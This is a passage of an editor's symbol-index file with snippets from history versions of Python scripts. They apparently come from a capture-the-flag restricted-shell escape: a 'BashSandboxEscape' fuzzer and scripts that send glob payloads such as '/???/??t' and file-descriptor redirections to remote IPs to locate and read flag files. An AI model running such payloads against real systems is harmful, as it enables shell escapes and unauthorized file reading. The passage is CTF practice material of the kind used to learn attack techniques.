        "peekOfCode": "PORT = 39615\n# Read payloads from file\nwith open('payloads.json', 'r') as f:\n    payloads = json.load(f)\n# Add \"tested\" key to each payload\nfor payload in payloads:\n    if isinstance(payload, str):\n        payload = {\"payload\": payload, \"tested\": False}\n    payload[\"tested\"] = False\n# Write updated payloads back to file",
        "detail": ".history.payloads.test_payloads_20250517144457",
        "documentation": {}
    },
    {
        "label": "sock",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144457",
        "description": ".history.payloads.test_payloads_20250517144457",
        "peekOfCode": "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections\nfor i, payload in enumerate(payloads):\n    try:\n        # Connect to server\n        sock.connect((HOST, PORT))\n        # Send payload\n        sock.sendall(payload['payload'].encode('utf-8'))\n        # Receive response\n        response = sock.recv(1024).decode('utf-8', errors='ignore')",
        "detail": ".history.payloads.test_payloads_20250517144457",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144528",
        "description": ".history.payloads.test_payloads_20250517144528",
        "peekOfCode": "HOST = '83.136.252.13'\nPORT = 39615\n# Read payloads from file\nwith open('payloads.json', 'r') as f:\n    payloads = json.load(f)\n# Add \"tested\" key to each payload with default False\nfor payload in payloads:\n    if isinstance(payload, str):\n        # Convert string payload to dictionary with \"tested\" flag\n        payload = {\"payload\": payload, \"tested\": False}",
        "detail": ".history.payloads.test_payloads_20250517144528",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144528",
        "description": ".history.payloads.test_payloads_20250517144528",
        "peekOfCode": "PORT = 39615\n# Read payloads from file\nwith open('payloads.json', 'r') as f:\n    payloads = json.load(f)\n# Add \"tested\" key to each payload with default False\nfor payload in payloads:\n    if isinstance(payload, str):\n        # Convert string payload to dictionary with \"tested\" flag\n        payload = {\"payload\": payload, \"tested\": False}\n    else:",
        "detail": ".history.payloads.test_payloads_20250517144528",
        "documentation": {}
    },
    {
        "label": "sock",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144528",
        "description": ".history.payloads.test_payloads_20250517144528",
        "peekOfCode": "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections\nfor i, payload in enumerate(payloads):\n    try:\n        # Connect to server\n        sock.connect((HOST, PORT))\n        # Send payload\n        sock.sendall(payload['payload'].encode('utf-8'))\n        # Receive response\n        response = sock.recv(1024).decode('utf-8', errors='ignore')",
        "detail": ".history.payloads.test_payloads_20250517144528",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144554",
        "description": ".history.payloads.test_payloads_20250517144554",
        "peekOfCode": "HOST = '83.136.252.13'\nPORT = 39615\n# Read payloads from file\nwith open('payloads.json', 'r') as f:\n    payloads = json.load(f)\n# Add \"tested\" key to each payload with default False\nfor payload in payloads:\n    if isinstance(payload, str):\n        # Convert string payload to dictionary with \"tested\" flag\n        payload = {\"payload\": payload, \"tested\": False}",
        "detail": ".history.payloads.test_payloads_20250517144554",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144554",
        "description": ".history.payloads.test_payloads_20250517144554",
        "peekOfCode": "PORT = 39615\n# Read payloads from file\nwith open('payloads.json', 'r') as f:\n    payloads = json.load(f)\n# Add \"tested\" key to each payload with default False\nfor payload in payloads:\n    if isinstance(payload, str):\n        # Convert string payload to dictionary with \"tested\" flag\n        payload = {\"payload\": payload, \"tested\": False}\n    else:",
        "detail": ".history.payloads.test_payloads_20250517144554",
        "documentation": {}
    },
    {
        "label": "sock",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144554",
        "description": ".history.payloads.test_payloads_20250517144554",
        "peekOfCode": "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections\nfor i, payload in enumerate(payloads):\n    try:\n        # Connect to server\n        sock.connect((HOST, PORT))\n        # Send payload\n        sock.sendall(payload['payload'].encode('utf-8'))\n        # Receive response\n        response = sock.recv(1024).decode('utf-8', errors='ignore')",
        "detail": ".history.payloads.test_payloads_20250517144554",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144620",
        "description": ".history.payloads.test_payloads_20250517144620",
        "peekOfCode": "HOST = '83.136.252.13'\nPORT = 39615\n# Read payloads from file\nwith open('payloads.json', 'r') as f:\n    payloads = json.load(f)\n# Add \"tested\" key to each payload with default False\nfor payload in payloads:\n    if isinstance(payload, str):\n        # Convert string payload to dictionary with \"tested\" flag\n        payload = {\"payload\": payload, \"tested\": False}",
        "detail": ".history.payloads.test_payloads_20250517144620",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144620",
        "description": ".history.payloads.test_payloads_20250517144620",
        "peekOfCode": "PORT = 39615\n# Read payloads from file\nwith open('payloads.json', 'r') as f:\n    payloads = json.load(f)\n# Add \"tested\" key to each payload with default False\nfor payload in payloads:\n    if isinstance(payload, str):\n        # Convert string payload to dictionary with \"tested\" flag\n        payload = {\"payload\": payload, \"tested\": False}\n    else:",
        "detail": ".history.payloads.test_payloads_20250517144620",
        "documentation": {}
    },
    {
        "label": "sock",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144620",
        "description": ".history.payloads.test_payloads_20250517144620",
        "peekOfCode": "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections\nfor i, payload in enumerate(payloads):\n    try:\n        # Connect to server\n        sock.connect((HOST, PORT))\n        # Send payload\n        sock.sendall(payload['payload'].encode('utf-8'))\n        # Receive response\n        response = sock.recv(1024).decode('utf-8', errors='ignore')",
        "detail": ".history.payloads.test_payloads_20250517144620",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517152630",
        "description": ".history.payloads.test_payloads_20250517152630",
        "peekOfCode": "HOST = '83.136.252.13'\nPORT = 39615\n# Read payloads from not_tested.txt\npayloads = []\ntry:\n    with open('not_tested.txt', 'r') as f:\n        for line in f:\n            line = line.strip()\n            if line and not line.startswith('#'):\n                payloads.append({\"payload\": line, \"tested\": False})",
        "detail": ".history.payloads.test_payloads_20250517152630",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517152630",
        "description": ".history.payloads.test_payloads_20250517152630",
        "peekOfCode": "PORT = 39615\n# Read payloads from not_tested.txt\npayloads = []\ntry:\n    with open('not_tested.txt', 'r') as f:\n        for line in f:\n            line = line.strip()\n            if line and not line.startswith('#'):\n                payloads.append({\"payload\": line, \"tested\": False})\nexcept FileNotFoundError:",
        "detail": ".history.payloads.test_payloads_20250517152630",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517152630",
        "description": ".history.payloads.test_payloads_20250517152630",
        "peekOfCode": "payloads = []\ntry:\n    with open('not_tested.txt', 'r') as f:\n        for line in f:\n            line = line.strip()\n            if line and not line.startswith('#'):\n                payloads.append({\"payload\": line, \"tested\": False})\nexcept FileNotFoundError:\n    print(\"Error: not_tested.txt file not found\")\n    sys.exit(1)",
        "detail": ".history.payloads.test_payloads_20250517152630",
        "documentation": {}
    },
    {
        "label": "tested_payloads",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517152630",
        "description": ".history.payloads.test_payloads_20250517152630",
        "peekOfCode": "tested_payloads = []\nif os.path.exists('tested.json'):\n    try:\n        with open('tested.json', 'r') as f:\n            tested_payloads = json.load(f)\n    except json.JSONDecodeError:\n        print(\"Warning: tested.json exists but is not valid JSON. Creating new file.\")\n# Create a TCP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections",
        "detail": ".history.payloads.test_payloads_20250517152630",
        "documentation": {}
    },
    {
        "label": "sock",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517152630",
        "description": ".history.payloads.test_payloads_20250517152630",
        "peekOfCode": "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections\nfor i, payload in enumerate(payloads):\n    try:\n        # Connect to server\n        sock.connect((HOST, PORT))\n        # Send payload\n        sock.sendall(payload['payload'].encode('utf-8'))\n        # Receive response\n        response = sock.recv(1024).decode('utf-8', errors='ignore')",
        "detail": ".history.payloads.test_payloads_20250517152630",
        "documentation": {}
    },
    {
        "label": "load_payloads",
        "kind": 2,
        "importPath": ".history.bashpoke_20250516062133",
        "description": ".history.bashpoke_20250516062133",
        "peekOfCode": "def load_payloads(modules, payloads_dir=\"payloads\"):\n    \"\"\"Loads payloads from specified module files.\"\"\"\n    all_payloads = []\n    for module in modules:\n        file_path = os.path.join(payloads_dir, f\"{module}.txt\")\n        if os.path.exists(file_path):\n            with open(file_path, 'r') as f:\n                all_payloads.extend([line.strip() for line in f if line.strip()])\n        else:\n            print(f\"Warning: Payload module '{module}' not found.\")",
        "detail": ".history.bashpoke_20250516062133",
        "documentation": {}
    },
    {
        "label": "filter_payloads",
        "kind": 2,
        "importPath": ".history.bashpoke_20250516062133",
        "description": ".history.bashpoke_20250516062133",
        "peekOfCode": "def filter_payloads(payloads, regex):\n    \"\"\"Filters payloads based on the allowed character regex.\"\"\"\n    if not regex:\n        return payloads\n    allowed_chars_pattern = re.compile(regex)\n    filtered_payloads = [p for p in payloads if allowed_chars_pattern.fullmatch(p)]\n    return filtered_payloads\ndef main():\n    parser = argparse.ArgumentParser(description=\"Bashpoke: Restricted shell fuzzer and enumerator.\")\n    parser.add_argument(\"--host\", required=True, help=\"Target host IP or hostname.\")",
        "detail": ".history.bashpoke_20250516062133",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.bashpoke_20250516062133",
        "description": ".history.bashpoke_20250516062133",
        "peekOfCode": "def main():\n    parser = argparse.ArgumentParser(description=\"Bashpoke: Restricted shell fuzzer and enumerator.\")\n    parser.add_argument(\"--host\", required=True, help=\"Target host IP or hostname.\")\n    parser.add_argument(\"--port\", required=True, type=int, help=\"Target port.\")\n    parser.add_argument(\"--regex\", help=\"Regex for allowed characters in payloads.\")\n    parser.add_argument(\"--modules\", default=\"env,files\", help=\"Comma-separated list of payload modules to use (e.g., env,files,redir).\")\n    parser.add_argument(\"--log\", help=\"Log results to a file.\")\n    parser.add_argument(\"--verbose\", action=\"store_true\", help=\"Enable verbose output.\")\n    args = parser.parse_args()\n    print(f\"[*] Loading payloads from modules: {args.modules}\")",
        "detail": ".history.bashpoke_20250516062133",
        "documentation": {}
    },
    {
        "label": "load_payloads",
        "kind": 2,
        "importPath": ".history.bash_sandbox_escape_20250516062219",
        "description": ".history.bash_sandbox_escape_20250516062219",
        "peekOfCode": "def load_payloads(modules, payloads_dir=\"payloads\"):\n    \"\"\"Loads payloads from specified module files.\"\"\"\n    all_payloads = []\n    for module in modules:\n        file_path = os.path.join(payloads_dir, f\"{module}.txt\")\n        if os.path.exists(file_path):\n            with open(file_path, 'r') as f:\n                all_payloads.extend([line.strip() for line in f if line.strip()])\n        else:\n            print(f\"Warning: Payload module '{module}' not found.\")",
        "detail": ".history.bash_sandbox_escape_20250516062219",
        "documentation": {}
    },
    {
        "label": "filter_payloads",
        "kind": 2,
        "importPath": ".history.bash_sandbox_escape_20250516062219",
        "description": ".history.bash_sandbox_escape_20250516062219",
        "peekOfCode": "def filter_payloads(payloads, regex):\n    \"\"\"Filters payloads based on the allowed character regex.\"\"\"\n    if not regex:\n        return payloads\n    allowed_chars_pattern = re.compile(regex)\n    filtered_payloads = [p for p in payloads if allowed_chars_pattern.fullmatch(p)]\n    return filtered_payloads\ndef main():\n    parser = argparse.ArgumentParser(description=\"BashSandboxEscape: Restricted shell fuzzer and enumerator.\")\n    parser.add_argument(\"--host\", required=True, help=\"Target host IP or hostname.\")",
        "detail": ".history.bash_sandbox_escape_20250516062219",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.bash_sandbox_escape_20250516062219",
        "description": ".history.bash_sandbox_escape_20250516062219",
        "peekOfCode": "def main():\n    parser = argparse.ArgumentParser(description=\"BashSandboxEscape: Restricted shell fuzzer and enumerator.\")\n    parser.add_argument(\"--host\", required=True, help=\"Target host IP or hostname.\")\n    parser.add_argument(\"--port\", required=True, type=int, help=\"Target port.\")\n    parser.add_argument(\"--regex\", help=\"Regex for allowed characters in payloads.\")\n    parser.add_argument(\"--modules\", default=\"env,files\", help=\"Comma-separated list of payload modules to use (e.g., env,files,redir).\")\n    parser.add_argument(\"--log\", help=\"Log results to a file.\")\n    parser.add_argument(\"--verbose\", action=\"store_true\", help=\"Enable verbose output.\")\n    args = parser.parse_args()\n    print(f\"[*] Loading payloads from modules: {args.modules}\")",
        "detail": ".history.bash_sandbox_escape_20250516062219",
        "documentation": {}
    },
    {
        "label": "load_payloads",
        "kind": 2,
        "importPath": ".history.bash_sandbox_escape_20250517145123",
        "description": ".history.bash_sandbox_escape_20250517145123",
        "peekOfCode": "def load_payloads(modules, payloads_dir=\"payloads\"):\n    \"\"\"Loads payloads from specified module files.\"\"\"\n    all_payloads = []\n    for module in modules:\n        file_path = os.path.join(payloads_dir, f\"{module}.txt\")\n        if os.path.exists(file_path):\n            with open(file_path, 'r') as f:\n                all_payloads.extend([line.strip() for line in f if line.strip()])\n        else:\n            print(f\"Warning: Payload module '{module}' not found.\")",
        "detail": ".history.bash_sandbox_escape_20250517145123",
        "documentation": {}
    },
    {
        "label": "filter_payloads",
        "kind": 2,
        "importPath": ".history.bash_sandbox_escape_20250517145123",
        "description": ".history.bash_sandbox_escape_20250517145123",
        "peekOfCode": "def filter_payloads(payloads, regex):\n    \"\"\"Filters payloads based on the allowed character regex.\"\"\"\n    if not regex:\n        return payloads\n    allowed_chars_pattern = re.compile(regex)\n    filtered_payloads = [p for p in payloads if allowed_chars_pattern.fullmatch(p)]\n    return filtered_payloads\ndef main():\n    parser = argparse.ArgumentParser(description=\"BashSandboxEscape: Restricted shell fuzzer and enumerator.\")\n    parser.add_argument(\"--host\", required=True, help=\"Target host IP or hostname.\")",
        "detail": ".history.bash_sandbox_escape_20250517145123",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.bash_sandbox_escape_20250517145123",
        "description": ".history.bash_sandbox_escape_20250517145123",
        "peekOfCode": "def main():\n    parser = argparse.ArgumentParser(description=\"BashSandboxEscape: Restricted shell fuzzer and enumerator.\")\n    parser.add_argument(\"--host\", required=True, help=\"Target host IP or hostname.\")\n    parser.add_argument(\"--port\", required=True, type=int, help=\"Target port.\")\n    parser.add_argument(\"--regex\", help=\"Regex for allowed characters in payloads.\")\n    parser.add_argument(\"--modules\", default=\"env,files\", help=\"Comma-separated list of payload modules to use (e.g., env,files,redir).\")\n    parser.add_argument(\"--log\", help=\"Log results to a file.\")\n    parser.add_argument(\"--verbose\", action=\"store_true\", help=\"Enable verbose output.\")\n    args = parser.parse_args()\n    print(f\"[*] Loading payloads from modules: {args.modules}\")",
        "detail": ".history.bash_sandbox_escape_20250517145123",
        "documentation": {}
    },
    {
        "label": "send",
        "kind": 2,
        "importPath": ".history.gpt_20250515211228",
        "description": ".history.gpt_20250515211228",
        "peekOfCode": "def send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\n# Guesses for cat path\ncat_paths = [\n    \"/???/??t\",     # like /bin/cat",
        "detail": ".history.gpt_20250515211228",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250515211228",
        "description": ".history.gpt_20250515211228",
        "peekOfCode": "def main():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((HOST, PORT))\n        banner = sock.recv(1024).decode(errors=\"ignore\")\n        print(f\"[+] Connected\\n{banner}\")\n        # Step 1: Discover /bin/cat or similar\n        found_cat = None\n        for path in cat_paths:\n            out = send(sock, path)\n            if \"cat\" in out:",
        "detail": ".history.gpt_20250515211228",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250515211228",
        "description": ".history.gpt_20250515211228",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\ndef send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\n# Guesses for cat path",
        "detail": ".history.gpt_20250515211228",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250515211228",
        "description": ".history.gpt_20250515211228",
        "peekOfCode": "PORT = 34445\ndef send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\n# Guesses for cat path\ncat_paths = [",
        "detail": ".history.gpt_20250515211228",
        "documentation": {}
    },
    {
        "label": "cat_paths",
        "kind": 5,
        "importPath": ".history.gpt_20250515211228",
        "description": ".history.gpt_20250515211228",
        "peekOfCode": "cat_paths = [\n    \"/???/??t\",     # like /bin/cat\n    \"/???/???/??t\", # like /usr/bin/cat\n]\n# Guesses for flag paths\nflag_globs = [\n    \"/???/???/fla?\",      # /home/user/flag\n    \"/???/???/fla?.???\",  # /home/user/flag.txt\n    \"/???/fla?\",          # /tmp/flag, /etc/flag\n    \"/???/fla?.txt\",",
        "detail": ".history.gpt_20250515211228",
        "documentation": {}
    },
    {
        "label": "flag_globs",
        "kind": 5,
        "importPath": ".history.gpt_20250515211228",
        "description": ".history.gpt_20250515211228",
        "peekOfCode": "flag_globs = [\n    \"/???/???/fla?\",      # /home/user/flag\n    \"/???/???/fla?.???\",  # /home/user/flag.txt\n    \"/???/fla?\",          # /tmp/flag, /etc/flag\n    \"/???/fla?.txt\",\n    \"/???/???/fla*\",      # more generic\n]\ndef main():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((HOST, PORT))",
        "detail": ".history.gpt_20250515211228",
        "documentation": {}
    },
    {
        "label": "send",
        "kind": 2,
        "importPath": ".history.gpt_20250515211244",
        "description": ".history.gpt_20250515211244",
        "peekOfCode": "def send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\n# Guesses for cat path\ncat_paths = [\n    \"/???/??t\",     # like /bin/cat",
        "detail": ".history.gpt_20250515211244",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250515211244",
        "description": ".history.gpt_20250515211244",
        "peekOfCode": "def main():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((HOST, PORT))\n        banner = sock.recv(1024).decode(errors=\"ignore\")\n        print(f\"[+] Connected\\n{banner}\")\n        # Step 1: Discover /bin/cat or similar\n        found_cat = None\n        for path in cat_paths:\n            out = send(sock, path)\n            if \"cat\" in out:",
        "detail": ".history.gpt_20250515211244",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250515211244",
        "description": ".history.gpt_20250515211244",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\ndef send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\n# Guesses for cat path",
        "detail": ".history.gpt_20250515211244",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250515211244",
        "description": ".history.gpt_20250515211244",
        "peekOfCode": "PORT = 34445\ndef send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\n# Guesses for cat path\ncat_paths = [",
        "detail": ".history.gpt_20250515211244",
        "documentation": {}
    },
    {
        "label": "cat_paths",
        "kind": 5,
        "importPath": ".history.gpt_20250515211244",
        "description": ".history.gpt_20250515211244",
        "peekOfCode": "cat_paths = [\n    \"/???/??t\",     # like /bin/cat\n    \"/???/???/??t\", # like /usr/bin/cat\n]\n# Guesses for flag paths\nflag_globs = [\n    \"/???/???/fla?\",      # /home/user/flag\n    \"/???/???/fla?.???\",  # /home/user/flag.txt\n    \"/???/fla?\",          # /tmp/flag, /etc/flag\n    \"/???/fla?.txt\",",
        "detail": ".history.gpt_20250515211244",
        "documentation": {}
    },
    {
        "label": "flag_globs",
        "kind": 5,
        "importPath": ".history.gpt_20250515211244",
        "description": ".history.gpt_20250515211244",
        "peekOfCode": "flag_globs = [\n    \"/???/???/fla?\",      # /home/user/flag\n    \"/???/???/fla?.???\",  # /home/user/flag.txt\n    \"/???/fla?\",          # /tmp/flag, /etc/flag\n    \"/???/fla?.txt\",\n    \"/???/???/fla*\",      # more generic\n]\ndef main():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((HOST, PORT))",
        "detail": ".history.gpt_20250515211244",
        "documentation": {}
    },
    {
        "label": "send",
        "kind": 2,
        "importPath": ".history.gpt_20250515211324",
        "description": ".history.gpt_20250515211324",
        "peekOfCode": "def send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\n# Guesses for cat path\ncat_paths = [\n    \"/???/??t\",     # like /bin/cat",
        "detail": ".history.gpt_20250515211324",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250515211324",
        "description": ".history.gpt_20250515211324",
        "peekOfCode": "def main():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((HOST, PORT))\n        banner = sock.recv(1024).decode(errors=\"ignore\")\n        print(f\"[+] Connected\\n{banner}\")\n        # Step 1: Discover /bin/cat or similar\n        found_cat = None\n        for path in cat_paths:\n            out = send(sock, path)\n            if \"cat\" in out:",
        "detail": ".history.gpt_20250515211324",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250515211324",
        "description": ".history.gpt_20250515211324",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\ndef send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\n# Guesses for cat path",
        "detail": ".history.gpt_20250515211324",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250515211324",
        "description": ".history.gpt_20250515211324",
        "peekOfCode": "PORT = 34445\ndef send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\n# Guesses for cat path\ncat_paths = [",
        "detail": ".history.gpt_20250515211324",
        "documentation": {}
    },
    {
        "label": "cat_paths",
        "kind": 5,
        "importPath": ".history.gpt_20250515211324",
        "description": ".history.gpt_20250515211324",
        "peekOfCode": "cat_paths = [\n    \"/???/??t\",     # like /bin/cat\n    \"/???/???/??t\", # like /usr/bin/cat\n]\n# Guesses for flag paths\nflag_globs = [\n    \"/???/???/fla?\",      # /home/user/flag\n    \"/???/???/fla?.???\",  # /home/user/flag.txt\n    \"/???/fla?\",          # /tmp/flag, /etc/flag\n    \"/???/fla?.txt\",",
        "detail": ".history.gpt_20250515211324",
        "documentation": {}
    },
    {
        "label": "flag_globs",
        "kind": 5,
        "importPath": ".history.gpt_20250515211324",
        "description": ".history.gpt_20250515211324",
        "peekOfCode": "flag_globs = [\n    \"/???/???/fla?\",      # /home/user/flag\n    \"/???/???/fla?.???\",  # /home/user/flag.txt\n    \"/???/fla?\",          # /tmp/flag, /etc/flag\n    \"/???/fla?.txt\",\n    \"/???/???/fla*\",      # more generic\n]\ndef main():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((HOST, PORT))",
        "detail": ".history.gpt_20250515211324",
        "documentation": {}
    },
    {
        "label": "send",
        "kind": 2,
        "importPath": ".history.gpt_20250515211918",
        "description": ".history.gpt_20250515211918",
        "peekOfCode": "def send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\ndef main():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((HOST, PORT))",
        "detail": ".history.gpt_20250515211918",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250515211918",
        "description": ".history.gpt_20250515211918",
        "peekOfCode": "def main():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((HOST, PORT))\n        print(sock.recv(1024).decode(errors=\"ignore\"))\n        # Try known dirs\n        send(sock, \"/bin\")\n        send(sock, \"/bin/\")\n        send(sock, \"/bin/cat\")\n        send(sock, \"/???\")\n        send(sock, \"/???/???\")",
        "detail": ".history.gpt_20250515211918",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250515211918",
        "description": ".history.gpt_20250515211918",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\ndef send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\ndef main():",
        "detail": ".history.gpt_20250515211918",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250515211918",
        "description": ".history.gpt_20250515211918",
        "peekOfCode": "PORT = 34445\ndef send(sock, command, wait=0.5):\n    print(f\"[>] {command}\")\n    sock.sendall((command + \"\\n\").encode())\n    time.sleep(wait)\n    output = sock.recv(4096).decode(errors=\"ignore\")\n    print(f\"[<] {output}\")\n    return output\ndef main():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:",
        "detail": ".history.gpt_20250515211918",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.gpt_20250515213904",
        "description": ".history.gpt_20250515213904",
        "peekOfCode": "def send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:\n            # Ensure the payload is sent with a newline to simulate Enter key\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # Allow time for the response\n            response = s.recv(4096).decode(errors='ignore')\n            return response\n        except Exception as e:\n            return f\"[ERROR] {e}\"",
        "detail": ".history.gpt_20250515213904",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250515213904",
        "description": ".history.gpt_20250515213904",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"[*] Testing payload: {payload}\")\n        output = send_payload(payload)\n        print(f\"[+] Response:\\n{output}\\n{'-' * 60}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": ".history.gpt_20250515213904",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250515213904",
        "description": ".history.gpt_20250515213904",
        "peekOfCode": "HOST = 'your.target.ip.or.hostname'\nPORT = 12345  # Replace with the actual port number\n# List of test payloads including redirections for file descriptors 6–10\ntest_payloads = [\n    \"6>&1\", \"7>&1\", \"8>&1\", \"9>&1\", \"10>&1\",\n    \"$((6>&1))\", \"$((7>&1))\", \"$((8>&1))\", \"$((9>&1))\", \"$((10>&1))\"\n]\ndef send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:",
        "detail": ".history.gpt_20250515213904",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250515213904",
        "description": ".history.gpt_20250515213904",
        "peekOfCode": "PORT = 12345  # Replace with the actual port number\n# List of test payloads including redirections for file descriptors 6–10\ntest_payloads = [\n    \"6>&1\", \"7>&1\", \"8>&1\", \"9>&1\", \"10>&1\",\n    \"$((6>&1))\", \"$((7>&1))\", \"$((8>&1))\", \"$((9>&1))\", \"$((10>&1))\"\n]\ndef send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:\n            # Ensure the payload is sent with a newline to simulate Enter key",
        "detail": ".history.gpt_20250515213904",
        "documentation": {}
    },
    {
        "label": "test_payloads",
        "kind": 5,
        "importPath": ".history.gpt_20250515213904",
        "description": ".history.gpt_20250515213904",
